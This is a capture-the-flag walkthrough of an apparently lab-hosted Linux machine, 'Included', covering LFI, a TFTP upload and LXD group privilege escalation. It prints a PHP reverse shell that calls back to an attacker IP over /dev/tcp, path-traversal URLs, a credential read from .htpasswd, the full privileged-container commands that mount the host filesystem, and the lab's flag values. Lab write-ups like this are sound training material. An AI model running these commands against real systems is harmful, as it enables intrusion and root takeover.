This is my walkthrough for the Included Box

# Included

## Level: Very Easy

## About:

Included is a very easy Linux machine that features exploiting TFTP, a vulnerable web application and the LXD group. Initial enumeration reveals a web server vulnerable to Local File Inclusion (LFI) which can be leveraged to access a TFTP server and upload a PHP reverse shell for initial access. Credentials can then be extracted from web configuration files to pivot to a higher-privileged user. Finally, privilege escalation can be achieved by leveraging the privileges of the LXD group to mount the host filesystem with elevated privileges in order to get full access to the filesystem.

## Questions:

1. What service is running on the target machine over UDP?

Ran command sudo nmap -sU 10.129.95.185

![](data:image/png;base64,)

TFTP is the only service that is confirmed by nmap to be 'open' and not 'open|filtered' unlike the rest.  
 

Ans: TFTP

1. What class of vulnerability is the webpage that is hosted on port 80 vulnerable to?

*A quick google search will lead you to the answer

Ans: Local File Inclusion

Local File Inclusion (LFI) is a classic vulnerability tied to path execution and traversal in web servers like Apache. Attackers exploit improper path handling to include arbitrary files, sometimes leading to code execution if those files contain executable code.

1. What is the default system folder that TFTP uses to store files?

*A quick google search will lead you to the answer

Ans: /var/lib/tftpboot/

1. Which interesting file is located in the webserver folder and can be used for Lateral Movement?

Used gobuster on the target machine:

![](data:image/png;base64,)

Ans: .htpasswd

1. What is the group that user Mike is a part of and can be exploited for Privilege Escalation?

Local File Inclusion:

Using the gobuster directory information, an attempt to access [http://<TARGET_IP>/index.php](http://%3cTARGET_IP%3e/index.php) was made. However, I was instead redirected to [http://<TARGET_IP>/?file=home.php](http://%3cTARGET_IP%3e/?file=home.php)

Rather than being a simply displaying a static page, the value of 'file' is taken, which in this case is home.php, and included in the page's code.

With this information, I was able to carry out Lateral Movement to find other details - and inputting [http://10.129.95.185/?file=../../../../../../etc/group](http://10.129.95.185/?file=../../../../../../etc/group) in the url resulted in the following:

![](data:image/png;base64,)

As observed in the screenshot, the group that mike belongs to is lxd.

Note: The question is asking for GROUP and NOT groupid.

Ans: lxd

1. When using an image to exploit a system via containers, we look for a very small distribution. Our favourite for this task is named after mountains. What is that distribution name?

*A quick google search will lead you to the answer

Ans: Alpine

1. What flag do we set to the container so that it has root privileges on the host system?

*A quick google search will lead you to the answer. Just remember to add the term 'lxd', otherwise you'll repeatedly get --privileged which is not the answer.

Ans: security.privileged=true

1. If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?

*No google search needed. Just good old logical guesswork.

Ans: /mnt/root

## LFI to RCE (Remote Code Execution)

I created a PHP shell since the site uses .php file, and named it includedshell.php with the following code:

<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.63/4444 0>&1'"); ?>

![](data:image/png;base64,)

And started a listening shell

![](data:image/png;base64,)

Since TFTP is a 'blind' protocol, I made a logical guess where the uploaded file would be. A search showed that the two most common locations are /var/lib/tftpboot/ and /srv/tftp.  
With that information alongside knowing this box has LFI vulnerbaility, I can point the file parameter to the above specific paths.

[http://10.129.95.185/?file=../../../../../../var/lib/tftpboot/includedshell.php](http://10.129.95.185/?file=../../../../../../var/lib/tftpboot/includedshell.php)

Our first attempt (the /var/lib/tftpboot/ path option) got us a shell -

![](data:image/png;base64,)

Running ls -la as www-data in /var/www/html revealed the .htpaswd file. (Although this was also seen when running gobuster). I used the cat command on said file and it revealed Mike's credentials to be - mike:Sheffield19

![](data:image/png;base64,)

Now I can switch users. But before that, I spawned a PTY to direct the system into giving me a real terminal with the command 'python3 -c 'import pty; pty.spawn("/bin/bash")'

And from there, I am able to switch to mike as a user using the command su and the obtained credentials. After which, I confirmed my identity and group as mike and lxd, using the commands 'whoami' and 'groups' respectively. 

![](data:image/png;base64,)

## Downloading and Building Alpine Builder from github (On your Attack Machine)

With the hint provided in question 6, a quick search revealed that Alpine Builder is required for this box. I acquired the lxd-alpine-builder script and built an image as shown below. Do note to run the script as root. (Even if you don't, the system is friendly enough to remind you)

![](data:image/png;base64,)

## Transferring the Image onto your Target Machine

On my attack machine, I created a basic HTTP server using the command python3 -m http.server 8000 to prepare for the file transfer over to the Target machine. I chose to use port 8000 because the default port 80 was already in use.

Then go back to the shell you created on your Target Machine to carry out the LXD exploit.

- Use wget to download the file onto the Target Machine

mike@included:/tmp$ wget [http://10.10.14.63:8000/alpine-v3.23-x86_64-20260328_1017.tar.gz](http://10.10.14.63:8000/alpine-v3.23-x86_64-20260328_1017.tar.gz)

- Import the image with lxc image import

mike@included:/tmp$ lxc image import alpine-v3.23-x86_64-20260328_1017.tar.gz --alias alpine

<ne-v3.23-x86_64-20260328_1017.tar.gz --alias alpine

- Initialize the Container using lxc init alpine privesc -c security.privileged=true (this allows us to have elevated privileges)

mike@included:/tmp$ lxc init alpine privesc -c security.privileged=true

lxc init alpine privesc -c security.privileged=true

Creating privesc

- Mount the Image

mike@included:/tmp$ lxc config device add privesc givemeroot disk source=/ path=/mnt/root recursive=true

<emeroot disk source=/ path=/mnt/root recursive=true

Device givemeroot added to privesc

- Start and Execute the exploit.

mike@included:/tmp$ lxc start privesc

lxc start privesc

mike@included:/tmp$ lxc exec privesc /bin/sh

lxc exec privesc /bin/sh

*Note: If, at any point, the lxc command fails with a 'no storage pool' error, run lxd init and accept all default settings first.

## Root access

A clear sign that I have root access now is the # symbol. But just to confirm, I ran whoami, and the system displays that I am running as root.

~ # ^[[37;5R whoami

 whoami

root

From there, I am able to obtain the flags of both the users mike and root.

## Obtaining the flags

After a quick few rounds of listing files and directories, I located both flags and simply used the command cat to read the contents.

For mike --> cat /mnt/root/home/mike/user.txt

For root --> cat /mnt/root/root/root.txt

~ # ^[[37;5Rcat /mnt/root/home/mike/user.txt

cat /mnt/root/home/mike/user.txt

a56ef91d70cfbf2cdb8f454c006935a1

~ # ^[[37;5Rcat /mnt/root/root/root.txt

cat /mnt/root/root/root.txt

c693d9c7499d9f572ee375d4c14c7bcf

User Flag: a56ef91d70cfbf2cdb8f454c006935a1

Root Flag: c693d9c7499d9f572ee375d4c14c7bcf

*Explanation:

An LXD container is similar to a mini-operating system, with its own /root, /home, and /etc folders.

If one typed ls -la when one first obtains root privileges, they would not see the flag file. Thus typing cat /root/root.txt results in the container looking into its own empty root folder and finding nothing.

Running the lxc config device add privesc givemeroot disk source=/ path=/mnt/root command takes the entire actual hard drive of the target machine and maps it to a folder called /mnt/root inside my own container.

Therefore, to find the real root flag, I, the attacker, would have to 'walk' through the paths -

- /mnt/root --> the mount point
- ../root --> the actual root user's home folder on the target machine
- ../root.txt --> the file containing root flag.
